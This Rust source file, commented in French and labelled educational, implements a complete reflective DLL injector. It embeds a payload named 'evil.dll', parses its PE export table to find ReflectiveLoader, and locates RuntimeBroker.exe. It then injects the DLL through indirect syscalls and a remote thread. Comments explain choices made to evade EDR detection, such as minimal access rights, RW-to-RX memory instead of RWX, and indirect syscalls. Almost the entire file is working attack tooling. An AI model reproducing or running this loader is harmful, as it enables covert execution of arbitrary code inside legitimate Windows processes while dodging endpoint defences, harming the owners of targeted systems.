/*
    ============================================================
    🦀 REFLECTIVE DLL LOADER v5 - ReflectiveLdr Edition
    ============================================================

    Ce loader démontre les concepts suivants:
    1. Reflective DLL Injection (ReflectiveLdr)
    2. PE Parsing pour trouver l'export ReflectiveLoader
    3. Indirect Syscalls (call stack légitime)
    4. Process Injection dans RuntimeBroker.exe
    5. Droits minimum (0x002A, pas PROCESS_ALL_ACCESS!)

    Flow v5:
    1. Lire la DLL reflective (include_bytes!)
    2. Parser le PE pour trouver l'offset de ReflectiveLoader
    3. Énumération des processes pour trouver RuntimeBroker.exe
    4. NtOpenProcess avec droits minimum
    5. NtAllocateVirtualMemory (remote, RW)
    6. NtWriteVirtualMemory (copie la DLL entière)
    7. NtProtectVirtualMemory (RW→RX)
    8. NtCreateThreadEx (remote thread → ReflectiveLoader)
    9. ReflectiveLoader mappe la DLL → DllMain → Payload!
    10. NtClose pour cleanup

    ⚠️  USAGE ÉDUCATIF UNIQUEMENT

    Auteur: Educational Purpose
*/

// ============================================================
// IMPORTS
// ============================================================

// Module local contenant les wrappers pour les syscalls indirects
// Voir syscalls/ pour l'implémentation (utilise rust_syscalls)
mod syscalls;

use std::mem::zeroed;   // Pour initialiser des structures à zéro
use std::ptr::null_mut; // Pointeur null pour les APIs Windows
use libc::c_void;       // Type void* pour la FFI

// Types NT (Native API) - structures Windows non documentées
use ntapi::ntapi_base::CLIENT_ID;  // Structure identifiant un thread/process
use ntapi::ntexapi::{PSYSTEM_PROCESS_INFORMATION, SystemProcessInformation}; // Pour énumération
use winapi::shared::ntdef::{HANDLE, NTSTATUS, NULL, OBJECT_ATTRIBUTES}; // Types de base Windows
use winapi::shared::ntstatus::STATUS_SUCCESS; // Code de succès 0x00000000

// ============================================================
// CONSTANTES MÉMOIRE - Protection et allocation
// ============================================================
// Ces constantes sont utilisées avec NtAllocateVirtualMemory et NtProtectVirtualMemory

const PAGE_READWRITE: u32 = 0x04;    // RW - Mémoire lisible et inscriptible
const PAGE_EXECUTE_READ: u32 = 0x20; // RX - Mémoire exécutable et lisible (pas RWX!)
const MEM_COMMIT_RESERVE: u32 = 0x3000; // MEM_COMMIT | MEM_RESERVE - Alloue et réserve

// ============================================================
// DROITS PROCESSUS - MINIMUM REQUIS
// ============================================================
// Au lieu d'utiliser PROCESS_ALL_ACCESS (0x1F0FFF) qui est suspect,
// on demande seulement les droits strictement nécessaires :

const PROCESS_CREATE_THREAD: u32 = 0x0002; // Droit de créer des threads
const PROCESS_VM_OPERATION: u32 = 0x0008;  // Droit de modifier la mémoire virtuelle
const PROCESS_VM_WRITE: u32 = 0x0020;      // Droit d'écrire dans la mémoire

// Combinaison minimale : 0x0002 | 0x0008 | 0x0020 = 0x002A
// Beaucoup moins suspect que PROCESS_ALL_ACCESS pour les EDR
const MINIMUM_ACCESS: u32 = PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE;

// ============================================================
// REFLECTIVE DLL EMBARQUÉE
// ============================================================
// La DLL est compilée avec ReflectiveLdr et embarquée statiquement dans le binaire
// via include_bytes! (pas de fichier sur disque)
// evil.dll contient :
//   - L'export ReflectiveLoader (point d'entrée du loader)
//   - Le code ReflectiveLdr (se charge lui-même en mémoire)
//   - DllMain avec la payload (MessageBox, etc.)
const DLL_BYTES: &[u8] = include_bytes!("../../reflective_dll/evil.dll");

// ============================================================
// STRUCTURES PE (Portable Executable)
// ============================================================
// Ces structures représentent le format des fichiers .exe/.dll Windows
// Elles sont utilisées pour parser la DLL et trouver l'export ReflectiveLoader
// Toutes les structures utilisent #[repr(C)] pour garantir le layout mémoire C

// DOS Header - Premier header d'un fichier PE (héritage MS-DOS)
#[repr(C)]
struct DosHeader {
    e_magic: u16,         // Magic number "MZ" (0x5A4D)
    _padding: [u8; 58],   // Champs DOS qu'on ignore
    e_lfanew: u32,        // Offset vers le NT Header (PE signature)
}

// NT Headers - Header principal PE (après DOS header)
#[repr(C)]
struct NtHeaders64 {
    signature: u32,                   // PE signature "PE\0\0" (0x4550)
    file_header: FileHeader,          // Informations générales du fichier
    optional_header: OptionalHeader64, // Header "optionnel" (mais toujours présent)
}

// File Header - Informations générales sur le fichier PE
#[repr(C)]
struct FileHeader {
    machine: u16,                   // Architecture (0x8664 = x64)
    number_of_sections: u16,        // Nombre de sections (.text, .data, etc.)
    time_date_stamp: u32,           // Timestamp de compilation
    pointer_to_symbol_table: u32,   // Pour le debugging (souvent 0)
    number_of_symbols: u32,         // Pour le debugging (souvent 0)
    size_of_optional_header: u16,   // Taille de l'OptionalHeader
    characteristics: u16,           // Flags (exe vs dll, etc.)
}

// Optional Header - Contient des métadonnées sur l'image PE (DLL/EXE)
// Appelé "optionnel" mais toujours présent dans les PE modernes
#[repr(C)]
struct OptionalHeader64 {
    magic: u16,                     // 0x20B pour PE64
    major_linker_version: u8,       // Version du linker
    minor_linker_version: u8,
    size_of_code: u32,              // Taille totale du code
    size_of_initialized_data: u32,  // Taille des données initialisées
    size_of_uninitialized_data: u32,// Taille des données non-init (.bss)
    address_of_entry_point: u32,    // RVA du point d'entrée (DllMain pour DLL)
    base_of_code: u32,              // RVA de la section code (.text)
    image_base: u64,                // Adresse de base préférée (ex: 0x140000000)
    section_alignment: u32,         // Alignement en mémoire (ex: 0x1000 = 4KB)
    file_alignment: u32,            // Alignement sur disque (ex: 0x200 = 512 bytes)
    major_os_version: u16,          // Version OS minimale
    minor_os_version: u16,
    major_image_version: u16,       // Version de l'image
    minor_image_version: u16,
    major_subsystem_version: u16,   // Version subsystem (ex: Win10 = 10.0)
    minor_subsystem_version: u16,
    win32_version_value: u32,       // Réservé (toujours 0)
    size_of_image: u32,             // Taille totale de l'image en mémoire
    size_of_headers: u32,           // Taille totale des headers
    checksum: u32,                  // Checksum PE (souvent 0 sauf drivers)
    subsystem: u16,                 // Type (GUI=2, CUI=3, DLL=1)
    dll_characteristics: u16,       // Flags (ASLR, DEP, etc.)
    size_of_stack_reserve: u64,     // Taille réservée pour la stack
    size_of_stack_commit: u64,      // Taille commitée pour la stack
    size_of_heap_reserve: u64,      // Taille réservée pour le heap
    size_of_heap_commit: u64,       // Taille commitée pour le heap
    loader_flags: u32,              // Obsolète
    number_of_rva_and_sizes: u32,   // Nombre de DataDirectories (16 standard)
    data_directories: [DataDirectory; 16], // Table des répertoires de données
}

// Data Directory - Pointeur vers une structure de données dans le PE
// Index 0 = Export Directory (celui qui nous intéresse ici)
// Index 1 = Import Directory, Index 2 = Resource Directory, etc.
#[repr(C)]
#[derive(Copy, Clone)]
struct DataDirectory {
    virtual_address: u32,  // RVA de la structure
    size: u32,             // Taille de la structure
}

// Section Header - Décrit une section du PE (.text, .data, .rdata, etc.)
#[repr(C)]
struct SectionHeader {
    name: [u8; 8],              // Nom de la section (ex: ".text\0\0\0")
    virtual_size: u32,          // Taille en mémoire
    virtual_address: u32,       // RVA de la section quand mappée
    size_of_raw_data: u32,      // Taille dans le fichier (peut être != virtual_size)
    pointer_to_raw_data: u32,   // Offset dans le fichier (file offset)
    pointer_to_relocations: u32,// Pour les fichiers .obj (0 dans PE final)
    pointer_to_linenumbers: u32,// Pour le debug (0 si strippé)
    number_of_relocations: u16, // Nombre de relocations
    number_of_linenumbers: u16, // Nombre de lignes debug
    characteristics: u32,       // Flags (executable, readable, writable, etc.)
}

// Export Directory - Table des exports d'une DLL
// Contient les noms de toutes les fonctions exportées et leurs adresses
#[repr(C)]
struct ExportDirectory {
    characteristics: u32,           // Réservé (0)
    time_date_stamp: u32,           // Timestamp de création
    major_version: u16,             // Version
    minor_version: u16,
    name: u32,                      // RVA du nom de la DLL
    base: u32,                      // Ordinal de base (souvent 1)
    number_of_functions: u32,       // Nombre total de fonctions exportées
    number_of_names: u32,           // Nombre de fonctions avec nom
    address_of_functions: u32,      // RVA du tableau des adresses de fonctions
    address_of_names: u32,          // RVA du tableau des noms (pointeurs vers strings)
    address_of_name_ordinals: u32,  // RVA du tableau des ordinals
}

// ============================================================
// FONCTION: rva_to_offset
// ============================================================
// Convertit un RVA (Relative Virtual Address) en offset fichier
//
// RVA = adresse relative quand la DLL est mappée en mémoire
// File Offset = position dans le fichier sur disque
//
// CRITIQUE: On injecte la DLL BRUTE (fichier), pas mappée !
// Donc on doit convertir RVA → File Offset
//
// Exemple:
//   ReflectiveLoader RVA: 0x3075
//   Section .text: VirtualAddress=0x1000, PointerToRawData=0x600
//   Offset dans section = 0x3075 - 0x1000 = 0x2075
//   File offset = 0x600 + 0x2075 = 0x2675
fn rva_to_offset(rva: u32, sections: &[SectionHeader]) -> Option<u32> {
    // Parcourt chaque section pour trouver celle qui contient le RVA
    for section in sections {
        let section_start = section.virtual_address;        // Début de la section en mémoire
        let section_end = section_start + section.virtual_size; // Fin de la section

        // Vérifie si le RVA est dans cette section
        if rva >= section_start && rva < section_end {
            // Calcule l'offset relatif dans la section
            let offset_in_section = rva - section_start;

            // Retourne: offset fichier de la section + offset dans la section
            return Some(section.pointer_to_raw_data + offset_in_section);
        }
    }

    // RVA pas trouvé dans aucune section (invalide)
    None
}

// ============================================================
// FONCTION: find_reflective_loader_offset
// ============================================================
// Parse une DLL PE pour trouver l'offset fichier de l'export "ReflectiveLoader"
//
// Cette fonction implémente un parser PE minimal pour :
// 1. Lire les headers (DOS, NT, Section headers)
// 2. Trouver l'Export Directory
// 3. Chercher "ReflectiveLoader" dans la table des exports
// 4. Convertir son RVA en offset fichier
//
// IMPORTANT: Utilise read_unaligned() partout car include_bytes! ne garantit
// pas l'alignement des données avec MinGW cross-compilation
fn find_reflective_loader_offset(dll_bytes: &[u8]) -> Result<u32, String> {
    unsafe {
        println!("[DEBUG] DLL size: {} bytes", dll_bytes.len());

        // ============================================================
        // ÉTAPE 1: Lire le DOS Header
        // ============================================================
        // Le DOS header est au début du fichier (offset 0)
        // On utilise read_unaligned pour éviter les crashes si le pointeur
        // retourné par dll_bytes.as_ptr() n'est pas aligné sur 4 bytes
        let dos_header = std::ptr::read_unaligned(dll_bytes.as_ptr() as *const DosHeader);

        // Vérifier le magic number "MZ" (0x5A4D)
        if dos_header.e_magic != 0x5A4D {
            return Err("Invalid DOS header".to_string());
        }

        println!(
            "[DEBUG] DOS header OK, e_lfanew: 0x{:X}",
            dos_header.e_lfanew
        );

        // ============================================================
        // ÉTAPE 2: Lire le NT Header
        // ============================================================
        // e_lfanew contient l'offset vers le NT Header (PE signature)
        let nt_headers = std::ptr::read_unaligned(
            dll_bytes.as_ptr().add(dos_header.e_lfanew as usize) as *const NtHeaders64
        );

        // Vérifier le PE signature "PE\0\0" (0x4550)
        if nt_headers.signature != 0x4550 {
            return Err("Invalid PE signature".to_string());
        }

        println!("[DEBUG] PE signature OK");
        println!(
            "[DEBUG] Number of sections: {}",
            nt_headers.file_header.number_of_sections
        );

        // ============================================================
        // ÉTAPE 3: Lire les Section Headers
        // ============================================================
        // Les section headers viennent immédiatement après l'Optional Header
        // Calcul de l'offset:
        //   e_lfanew + 4 (signature) + sizeof(FileHeader) + sizeof(OptionalHeader)
        let sections_offset = dos_header.e_lfanew as usize
            + 4  // Taille de la PE signature (4 bytes)
            + std::mem::size_of::<FileHeader>()
            + nt_headers.file_header.size_of_optional_header as usize;

        // Lire chaque section header avec read_unaligned et les stocker dans un Vec
        let num_sections = nt_headers.file_header.number_of_sections as usize;
        let mut sections = Vec::with_capacity(num_sections);
        for i in 0..num_sections {
            let section = std::ptr::read_unaligned(
                dll_bytes.as_ptr().add(sections_offset + i * std::mem::size_of::<SectionHeader>())
                    as *const SectionHeader
            );
            sections.push(section);
        }

        // ============================================================
        // ÉTAPE 4: Trouver l'Export Directory
        // ============================================================
        // L'Export Directory est dans DataDirectories[0] (index 0)
        // Il contient la table de tous les exports de la DLL
        let export_dir_rva = nt_headers.optional_header.data_directories[0].virtual_address;

        // Si RVA = 0, la DLL n'exporte rien (erreur)
        if export_dir_rva == 0 {
            return Err("No export directory".to_string());
        }

        println!("[DEBUG] Export dir RVA: 0x{:X}", export_dir_rva);

        // Convertir le RVA en file offset pour pouvoir le lire
        let export_dir_offset =
            rva_to_offset(export_dir_rva, &sections).ok_or("Failed to convert export dir RVA")?;

        println!("[DEBUG] Export dir offset: 0x{:X}", export_dir_offset);

        // Lire l'Export Directory avec read_unaligned
        let export_dir = std::ptr::read_unaligned(
            dll_bytes.as_ptr().add(export_dir_offset as usize) as *const ExportDirectory
        );

        println!("[DEBUG] Number of names: {}", export_dir.number_of_names);

        // ============================================================
        // ÉTAPE 5: Convertir les RVA des tables d'export en file offsets
        // ============================================================
        // L'Export Directory contient 3 tables parallèles:
        // - address_of_names: tableau de RVA vers les noms (strings)
        // - address_of_name_ordinals: tableau d'ordinals (index dans la table des fonctions)
        // - address_of_functions: tableau de RVA vers les fonctions
        //
        // Pour trouver une fonction par nom:
        //   1. Chercher le nom dans address_of_names → index i
        //   2. Lire l'ordinal à address_of_name_ordinals[i] → ordinal
        //   3. Lire le RVA de la fonction à address_of_functions[ordinal]

        let names_offset = rva_to_offset(export_dir.address_of_names, &sections)
            .ok_or("Failed to convert names RVA")?;
        let functions_offset = rva_to_offset(export_dir.address_of_functions, &sections)
            .ok_or("Failed to convert functions RVA")?;
        let ordinals_offset = rva_to_offset(export_dir.address_of_name_ordinals, &sections)
            .ok_or("Failed to convert ordinals RVA")?;

        // ============================================================
        // ÉTAPE 6: Parcourir les exports pour trouver "ReflectiveLoader"
        // ============================================================
        for i in 0..export_dir.number_of_names {
            // Lire le RVA du nom à l'index i (tableau de u32)
            // Chaque entrée fait 4 bytes → offset = names_offset + i * 4
            let name_rva_ptr = dll_bytes
                .as_ptr()
                .add(names_offset as usize + (i * 4) as usize)
                as *const u32;
            let name_rva = std::ptr::read_unaligned(name_rva_ptr);

            // Convertir le RVA en file offset pour lire la string
            let name_offset = match rva_to_offset(name_rva, &sections) {
                Some(o) => o,
                None => continue, // RVA invalide, skip
            };

            // Lire le nom (C string null-terminated)
            let name_ptr = dll_bytes.as_ptr().add(name_offset as usize);
            let name = std::ffi::CStr::from_ptr(name_ptr as *const i8)
                .to_str()
                .unwrap_or("");

            // Comparer avec "ReflectiveLoader"
            if name == "ReflectiveLoader" {
                println!("[DEBUG] Found ReflectiveLoader at index {}", i);

                // ============================================================
                // ÉTAPE 7: Trouver l'adresse de ReflectiveLoader
                // ============================================================

                // Lire l'ordinal correspondant à cet export (tableau de u16)
                // Chaque entrée fait 2 bytes → offset = ordinals_offset + i * 2
                let ordinal_ptr = dll_bytes
                    .as_ptr()
                    .add(ordinals_offset as usize + (i * 2) as usize)
                    as *const u16;
                let ordinal = std::ptr::read_unaligned(ordinal_ptr);

                // Lire le RVA de la fonction dans la table des fonctions (tableau de u32)
                // Chaque entrée fait 4 bytes → offset = functions_offset + ordinal * 4
                let func_rva_ptr = dll_bytes
                    .as_ptr()
                    .add(functions_offset as usize + (ordinal as usize * 4))
                    as *const u32;
                let func_rva = std::ptr::read_unaligned(func_rva_ptr);

                println!("[DEBUG] Function RVA: 0x{:X}", func_rva);

                // ============================================================
                // ÉTAPE 8: Convertir le RVA en file offset (CRUCIAL!)
                // ============================================================
                // On injecte la DLL BRUTE (fichier), pas mappée en mémoire
                // Donc on doit convertir le RVA en offset fichier
                let func_offset = rva_to_offset(func_rva, &sections)
                    .ok_or("Failed to convert function RVA to file offset")?;

                println!("[DEBUG] Function file offset: 0x{:X}", func_offset);

                // Retourner l'offset fichier de ReflectiveLoader
                return Ok(func_offset);
            }
        }

        // "ReflectiveLoader" pas trouvé dans la table des exports
        Err("ReflectiveLoader export not found".to_string())
    }
}

// ============================================================
// FONCTION: find_process_pid
// ============================================================
// Énumère tous les processus et retourne le PID du premier
// processus correspondant au nom donné (ex: "RuntimeBroker.exe")
//
// Utilise NtQuerySystemInformation avec SystemProcessInformation
// pour obtenir la liste de tous les processus
fn find_process_pid(target_name: &str) -> Option<u32> {
    unsafe {
        // ============================================================
        // ÉTAPE 1: Allouer un buffer pour NtQuerySystemInformation
        // ============================================================
        // Ce syscall retourne une liste chaînée de structures SYSTEM_PROCESS_INFORMATION
        // La taille nécessaire varie, mais 1MB est généralement suffisant
        let buffer_size: u32 = 1024 * 1024; // 1 MB
        let mut buffer: Vec<u8> = vec![0; buffer_size as usize];
        let mut return_length: u32 = 0;

        // ============================================================
        // ÉTAPE 2: Appeler NtQuerySystemInformation via syscall indirect
        // ============================================================
        // SystemProcessInformation (5) = récupère infos sur tous les processus
        let status: i32 = syscall!(
            "NtQuerySystemInformation",
            SystemProcessInformation as u32,  // Information class = 5
            buffer.as_mut_ptr() as *mut c_void, // Buffer pour recevoir les données
            buffer_size,                       // Taille du buffer
            &mut return_length as *mut u32     // Taille réelle utilisée
        );

        if status != 0 {
            eprintln!("[✗] NtQuerySystemInformation failed: {:#X}", status);
            return None;
        }

        // ============================================================
        // ÉTAPE 3: Parser la liste chaînée SYSTEM_PROCESS_INFORMATION
        // ============================================================
        // Le buffer contient une liste chaînée de structures
        // Chaque structure contient:
        //   - NextEntryOffset: offset vers la prochaine structure (0 = fin)
        //   - UniqueProcessId: PID du processus
        //   - ImageName: nom du processus (UNICODE_STRING)
        let mut offset = 0usize;
        loop {
            // Caster le pointeur à la structure SYSTEM_PROCESS_INFORMATION
            let entry = &*(buffer.as_ptr().add(offset) as PSYSTEM_PROCESS_INFORMATION);

            // Vérifier si le processus a un nom (pas toujours le cas, ex: System Idle Process)
            if !entry.ImageName.Buffer.is_null() && entry.ImageName.Length > 0 {
                // ImageName est un UNICODE_STRING (UTF-16)
                // Buffer pointe vers des u16, Length est en bytes
                // Donc: Length / 2 = nombre de caractères u16
                let name_slice = std::slice::from_raw_parts(
                    entry.ImageName.Buffer,
                    (entry.ImageName.Length / 2) as usize,
                );

                // Convertir UTF-16 → String et comparer (case insensitive)
                let name = String::from_utf16_lossy(name_slice).to_lowercase();

                if name == target_name.to_lowercase() {
                    // Trouvé ! Retourner le PID
                    return Some(entry.UniqueProcessId as u32);
                }
            }

            // NextEntryOffset = 0 signifie qu'on est à la dernière entrée
            if entry.NextEntryOffset == 0 {
                break;
            }

            // Avancer vers la prochaine entrée
            offset += entry.NextEntryOffset as usize;
        }

        // Processus pas trouvé
        None
    }
}

// ============================================================
// FONCTION: inject_reflective_dll
// ============================================================
// Fonction principale qui injecte une DLL reflective dans un processus cible
//
// Paramètres:
//   - target_pid: PID du processus cible (ex: RuntimeBroker.exe)
//   - dll_bytes: Bytes bruts de la DLL (evil.dll)
//   - loader_offset: File offset de ReflectiveLoader dans la DLL
//
// Étapes:
//   1. NtOpenProcess - Ouvrir le processus avec droits minimum
//   2. NtAllocateVirtualMemory - Allouer mémoire RW distante
//   3. NtWriteVirtualMemory - Copier la DLL entière
//   4. NtProtectVirtualMemory - Changer RW → RX
//   5. Calculer l'adresse de ReflectiveLoader
//   6. NtCreateThreadEx - Créer thread distant à ReflectiveLoader
//   7. NtClose - Cleanup (fermer handles)
fn inject_reflective_dll(
    target_pid: u32,
    dll_bytes: &[u8],
    loader_offset: u32,
) -> Result<(), String> {
    println!("[*] Target PID: {}", target_pid);
    println!("[*] DLL size: {} bytes", dll_bytes.len());
    println!("[*] ReflectiveLoader offset: 0x{:X}", loader_offset);

    unsafe {
        // =====================================================
        // ÉTAPE 1: NtOpenProcess
        // =====================================================
        // Ouvre le processus cible pour obtenir un HANDLE
        // On utilise MINIMUM_ACCESS (0x002A) au lieu de PROCESS_ALL_ACCESS
        // pour être moins suspect aux yeux des EDR
        println!(
            "\n[STEP 1] NtOpenProcess (minimum rights: 0x{:04X})",
            MINIMUM_ACCESS
        );
        println!("────────────────────────────────────────────");

        let mut h_process: HANDLE = null_mut();

        // OBJECT_ATTRIBUTES - structure requise par NtOpenProcess
        // Doit être initialisée à zéro avec Length = sizeof(OBJECT_ATTRIBUTES)
        let mut obj_attr: OBJECT_ATTRIBUTES = zeroed();
        obj_attr.Length = std::mem::size_of::<OBJECT_ATTRIBUTES>() as u32;

        // CLIENT_ID - identifie le processus cible par son PID
        let mut client_id = CLIENT_ID {
            UniqueProcess: target_pid as HANDLE, // PID du processus cible
            UniqueThread: null_mut(),             // null car on ouvre un process, pas un thread
        };

        // Appel du syscall indirect NtOpenProcess
        // Paramètres:
        //   - ProcessHandle (out): recevra le handle
        //   - DesiredAccess: droits demandés (0x002A)
        //   - ObjectAttributes: attributs (zeroed)
        //   - ClientId: PID du processus
        let status: NTSTATUS = syscall!(
            "NtOpenProcess",
            &mut h_process as *mut HANDLE,
            MINIMUM_ACCESS,
            &mut obj_attr as *mut OBJECT_ATTRIBUTES,
            &mut client_id as *mut CLIENT_ID
        );

        // Vérifier le status (0x00000000 = STATUS_SUCCESS)
        if status != STATUS_SUCCESS {
            return Err(format!("NtOpenProcess failed: {:#X}", status));
        }

        println!("[+] Process handle: {:p}", h_process);

        // =====================================================
        // ÉTAPE 2: NtAllocateVirtualMemory (remote, RW)
        // =====================================================
        // Alloue de la mémoire dans le processus distant
        // On alloue en RW (Read-Write) d'abord, on changera en RX après
        // Pourquoi pas RWX directement ? Car RWX est très suspect pour les EDR
        println!("\n[STEP 2] NtAllocateVirtualMemory (remote, RW)");
        println!("────────────────────────────────────────────");

        let mut base_address: *mut c_void = null_mut(); // Adresse allouée (out)
        let mut region_size: usize = dll_bytes.len();   // Taille à allouer

        // Appel du syscall indirect NtAllocateVirtualMemory
        // Paramètres:
        //   - ProcessHandle: handle du processus cible
        //   - BaseAddress (in/out): null_mut() = kernel choisit l'adresse
        //   - ZeroBits: 0 = pas de contrainte d'adresse
        //   - RegionSize (in/out): taille à allouer
        //   - AllocationType: MEM_COMMIT | MEM_RESERVE (0x3000)
        //   - Protect: PAGE_READWRITE (0x04)
        let status: NTSTATUS = syscall!(
            "NtAllocateVirtualMemory",
            h_process,
            &mut base_address as *mut _ as *mut _,
            0usize,                            // ZeroBits
            &mut region_size as *mut usize,
            MEM_COMMIT_RESERVE,
            PAGE_READWRITE
        );

        if status != STATUS_SUCCESS {
            let _: NTSTATUS = syscall!("NtClose", h_process);
            return Err(format!("NtAllocateVirtualMemory failed: {:#X}", status));
        }

        println!("[+] Remote memory at: {:p}", base_address);

        // =====================================================
        // ÉTAPE 3: NtWriteVirtualMemory (copie la DLL entière)
        // =====================================================
        // Copie la DLL brute (fichier) dans la mémoire distante
        // IMPORTANT: On copie la DLL ENTIÈRE, pas seulement le code
        // ReflectiveLoader aura besoin des headers PE pour se mapper correctement
        println!("\n[STEP 3] NtWriteVirtualMemory (copy entire DLL)");
        println!("────────────────────────────────────────────");

        let mut bytes_written: usize = 0;

        // Appel du syscall indirect NtWriteVirtualMemory
        // Paramètres:
        //   - ProcessHandle: handle du processus cible
        //   - BaseAddress: adresse où écrire (allouée à l'étape 2)
        //   - Buffer: données à copier (dll_bytes)
        //   - NumberOfBytesToWrite: taille à copier
        //   - NumberOfBytesWritten (out): nombre de bytes réellement écrits
        let status: NTSTATUS = syscall!(
            "NtWriteVirtualMemory",
            h_process,
            base_address,
            dll_bytes.as_ptr() as *const c_void,
            dll_bytes.len(),
            &mut bytes_written as *mut usize
        );

        if status != STATUS_SUCCESS {
            let _: NTSTATUS = syscall!("NtClose", h_process);
            return Err(format!("NtWriteVirtualMemory failed: {:#X}", status));
        }

        println!("[+] Written {} bytes to remote process", bytes_written);

        // =====================================================
        // ÉTAPE 4: NtProtectVirtualMemory (RW → RX)
        // =====================================================
        println!("\n[STEP 4] NtProtectVirtualMemory (RW → RX)");
        println!("────────────────────────────────────────────");

        let mut old_protect: u32 = 0;
        let mut protect_addr = base_address;
        let mut protect_size = dll_bytes.len();

        let status: NTSTATUS = syscall!(
            "NtProtectVirtualMemory",
            h_process,
            &mut protect_addr as *mut _ as *mut _,
            &mut protect_size as *mut usize,
            PAGE_EXECUTE_READ,
            &mut old_protect as *mut u32
        );

        if status != STATUS_SUCCESS {
            let _: NTSTATUS = syscall!("NtClose", h_process);
            return Err(format!("NtProtectVirtualMemory failed: {:#X}", status));
        }

        println!(
            "[+] Protection: 0x{:02X} → 0x{:02X}",
            old_protect, PAGE_EXECUTE_READ
        );

        // =====================================================
        // ÉTAPE 5: Calculer l'adresse de ReflectiveLoader
        // =====================================================
        println!("\n[STEP 5] Calculate ReflectiveLoader address");
        println!("────────────────────────────────────────────");

        let loader_address = (base_address as usize + loader_offset as usize) as *mut c_void;
        println!("[+] Base address:        {:p}", base_address);
        println!("[+] Loader offset:       0x{:X}", loader_offset);
        println!("[+] Loader address:      {:p}", loader_address);

        // =====================================================
        // ÉTAPE 6: NtCreateThreadEx (remote thread → ReflectiveLoader)
        // =====================================================
        println!("\n[STEP 6] NtCreateThreadEx (start ReflectiveLoader)");
        println!("────────────────────────────────────────────");

        let mut thread_handle: *mut c_void = null_mut();

        let status: NTSTATUS = syscall!(
            "NtCreateThreadEx",
            &mut thread_handle as *mut _ as *mut _,
            0x1FFFFFu32,
            NULL,
            h_process,
            loader_address, // ← Démarre à ReflectiveLoader, pas au début de la DLL!
            base_address,   // ← Passe l'adresse de base en paramètre
            0u32,
            0usize,
            0usize,
            0usize,
            NULL
        );

        if status != STATUS_SUCCESS {
            let _: NTSTATUS = syscall!("NtClose", h_process);
            return Err(format!("NtCreateThreadEx failed: {:#X}", status));
        }

        println!("[+] Remote thread created: {:p}", thread_handle);
        println!("[+] ReflectiveLoader executing...");

        // =====================================================
        // ÉTAPE 7: NtClose (cleanup)
        // =====================================================
        println!("\n[STEP 7] NtClose (cleanup)");
        println!("────────────────────────────────────────────");

        let _: NTSTATUS = syscall!("NtClose", thread_handle);
        let _: NTSTATUS = syscall!("NtClose", h_process);

        println!("[+] Handles closed");

        Ok(())
    }
}

fn main() {
    println!(
        r#"
    ╔═══════════════════════════════════════════════════════════╗
    ║   REFLECTIVE DLL LOADER v5 - ReflectiveLdr Edition        ║
    ║                                                           ║
    ║  Techniques:                                              ║
    ║  ✓ Reflective DLL Injection (ReflectiveLdr)               ║
    ║  ✓ PE Parsing (find ReflectiveLoader export)              ║
    ║  ✓ Process injection into existing RuntimeBroker.exe      ║
    ║  ✓ Indirect syscalls                                      ║
    ║  ✓ Minimum rights (0x002A)                                ║
    ║  ✓ RW → RX memory protection                              ║
    ║                                                           ║
    ║  Syscalls used:                                           ║
    ║  • NtOpenProcess        • NtProtectVirtualMemory          ║
    ║  • NtAllocateVirtualMemory  • NtCreateThreadEx            ║
    ║  • NtWriteVirtualMemory     • NtClose                     ║
    ║                                                           ║
    ║    FOR EDUCATIONAL PURPOSES ONLY                          ║
    ╚═══════════════════════════════════════════════════════════╝
    "#
    );

    // =========================================================
    // ÉTAPE 1: Parser la DLL pour trouver ReflectiveLoader
    // =========================================================
    println!("[*] Parsing DLL to find ReflectiveLoader export...");

    let loader_offset = match find_reflective_loader_offset(DLL_BYTES) {
        Ok(offset) => {
            println!("[+] Found ReflectiveLoader at offset: 0x{:X}", offset);
            offset
        }
        Err(e) => {
            eprintln!("[✗] Failed to parse DLL: {}", e);
            std::process::exit(1);
        }
    };

    // =========================================================
    // ÉTAPE 2: Trouver RuntimeBroker.exe
    // =========================================================
    println!("\n[*] Searching for RuntimeBroker.exe...");

    let pid = match find_process_pid("RuntimeBroker.exe") {
        Some(pid) => pid,
        None => {
            eprintln!("[✗] RuntimeBroker.exe not found!");
            eprintln!("[*] Tip: Open Windows Settings to spawn RuntimeBroker.exe");
            std::process::exit(1);
        }
    };

    println!("[+] Found RuntimeBroker.exe with PID: {}", pid);

    // =========================================================
    // ÉTAPE 3: Injecter la DLL reflective
    // =========================================================
    match inject_reflective_dll(pid, DLL_BYTES, loader_offset) {
        Ok(_) => {
            println!("\n════════════════════════════════════════════");
            println!("[✓] SUCCESS: Reflective DLL injected!");
            println!("[✓] ReflectiveLoader → DllMain → Payload executed!");
            println!("════════════════════════════════════════════");
        }
        Err(e) => {
            eprintln!("\n[✗] ERROR: {}", e);
            std::process::exit(1);
        }
    }
}
